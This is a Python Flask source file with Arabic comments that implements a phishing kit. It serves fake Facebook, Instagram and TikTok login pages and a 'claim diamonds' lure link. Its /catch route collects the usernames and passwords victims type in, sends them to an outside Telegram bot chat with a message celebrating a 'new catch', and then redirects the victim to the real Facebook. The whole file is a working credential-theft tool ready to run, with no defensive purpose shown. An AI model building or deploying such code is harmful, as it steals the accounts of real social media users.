from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# --- إعدادات التيليجرام (عمرهم بمعلوماتك) ---
TOKEN = "حط_هنا_التوكن_اللي_عطاهولك_BotFather"
CHAT_ID = "7479786207"

# --- الواجهة الاحترافية (HTML) ---
hacker_ui = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FARES x HAJ Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #050505; color: white; font-family: sans-serif; }
        .box { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .neon-glow { color: #fff; text-shadow: 0 0 10px #fff, 0 0 20px #00ffff; font-weight: 900; }
        .slider-container { background: rgba(255, 255, 255, 0.1); border-radius: 50px; position: relative; height: 60px; overflow: hidden; margin-top: 20px; }
        .slider-handle { width: 60px; height: 60px; background: #22c55e; border-radius: 50%; position: absolute; left: 0; display: flex; align-items: center; justify-content: center; color: white; cursor: pointer; z-index: 10; }
        .slider-text { position: absolute; width: 100%; text-align: center; line-height: 60px; color: #a1a1aa; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen px-4">
    <div class="box p-10 rounded-[40px] text-center w-full max-w-sm">
        <div class="text-7xl mb-4 text-white"><i class="fas fa-user-secret"></i></div>
        <h1 class="text-3xl neon-glow mb-10 tracking-widest uppercase">FARES x HAJ</h1>
        <div class="space-y-4 mb-6">
            <a href="/login/facebook" class="flex items-center justify-between bg-[#1877f2] p-4 rounded-2xl font-bold transition hover:scale-105">
                <i class="fab fa-facebook-f text-xl w-8"></i><span>فيسبوك</span><div class="w-8"></div>
            </a>
            <a href="/login/instagram" class="flex items-center justify-between bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-4 rounded-2xl font-bold transition hover:scale-105">
                <i class="fab fa-instagram text-xl w-8"></i><span>إنستغرام</span><div class="w-8"></div>
            </a>
            <a href="/login/tiktok" class="flex items-center justify-between bg-black border border-gray-600 p-4 rounded-2xl font-bold transition hover:scale-105">
                <i class="fab fa-tiktok text-xl w-8 text-[#ff0050]"></i><span>تيك توك</span><div class="w-8"></div>
            </a>
        </div>
        <div class="slider-container" id="container">
            <div class="slider-text">اسحب للتحقق السريع >>></div>
            <div class="slider-handle" id="handle"><i class="fas fa-arrow-right"></i></div>
        </div>
    </div>
    <script>
        const handle = document.getElementById('handle');
        const container = document.getElementById('container');
        let isDragging = false;
        const drag = (e) => {
            if (!isDragging) return;
            let event = e.touches ? e.touches[0] : e;
            let x = event.clientX - container.getBoundingClientRect().left - 30;
            if (x < 0) x = 0;
            if (x > container.offsetWidth - 60) {
                x = container.offsetWidth - 60;
                window.location.href = "https://linktr.ee/claimdiamonds2026";
            }
            handle.style.left = x + 'px';
        };
        handle.addEventListener('mousedown', () => isDragging = true);
        handle.addEventListener('touchstart', () => isDragging = true);
        window.addEventListener('mousemove', drag);
        window.addEventListener('touchmove', drag);
        window.addEventListener('mouseup', () => { isDragging = false; handle.style.left = '0'; });
        window.addEventListener('touchend', () => { isDragging = false; handle.style.left = '0'; });
    </script>
</body>
</html>
"""

login_template = """
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<script src="https://cdn.tailwindcss.com"></script>
<body class="{{bg_class}} flex flex-col items-center pt-10 px-4" dir="rtl">
    {{logo_icon}}
    <div class="{{box_class}} p-6 rounded-xl shadow-md w-full max-w-[400px]">
        <form action="/catch?platform={{platform}}" method="POST" class="space-y-4">
            <input type="text" name="user" placeholder="{{user_placeholder}}" class="w-full border p-3 rounded-lg bg-gray-50 outline-none focus:border-blue-500" required>
            <input type="password" name="pass" placeholder="كلمة السر" class="w-full border p-3 rounded-lg bg-gray-50 outline-none focus:border-blue-500" required>
            <button class="{{btn_class}} text-white p-3 rounded-lg font-bold text-xl w-full">تسجيل الدخول</button>
            <div class="text-center text-sm mt-4 text-blue-600 cursor-pointer">هل نسيت كلمة السر؟</div>
            <hr class="my-6">
            <div class="flex justify-center"><button type="button" class="bg-[#42b72a] text-white px-4 py-2 rounded-lg font-bold">إنشاء حساب جديد</button></div>
        </form>
    </div>
</body>
"""

@app.route('/')
def home(): return render_template_string(hacker_ui)

@app.route('/login/<platform>')
def login(platform):
    configs = {
        'facebook': {'bg': 'bg-[#f0f2f5]', 'box': 'bg-white', 'btn': 'bg-[#1877f2]', 'user': 'رقم الهاتف أو البريد', 'logo': '<i class="fab fa-facebook text-[#1877f2] text-6xl mb-8"></i>'},
        'instagram': {'bg': 'bg-white', 'box': 'border border-gray-300', 'btn': 'bg-blue-500', 'user': 'اسم المستخدم أو الهاتف', 'logo': '<h1 class="font-serif text-4xl mb-8">Instagram</h1>'},
        'tiktok': {'bg': 'bg-white', 'box': 'border border-gray-100', 'btn': 'bg-[#fe2c55]', 'user': 'رقم الهاتف أو المستخدم', 'logo': '<i class="fab fa-tiktok text-6xl mb-6"></i>'}
    }
    c = configs.get(platform, configs['facebook'])
    return render_template_string(login_template, bg_class=c['bg'], box_class=c['box'], btn_class=c['btn'], user_placeholder=c['user'], logo_icon=c['logo'], platform=platform)

@app.route('/catch', methods=['POST'])
def catch():
    user = request.form.get('user')
    pwd = request.form.get('pass')
    platform = request.args.get('platform')
    
    # رسالة التبليغ اللي توصلك للتيليجرام
    msg = f"🔥 صيد جديد يا فارس! 🔥\\n\\n👤 المنصة: {platform.upper()}\\n📧 الحساب: {user}\\n🔑 المودباس: {pwd}"
    
    # إرسال البيانات للتيليجرام
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
    requests.get(url)
    
    return redirect('https://facebook.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
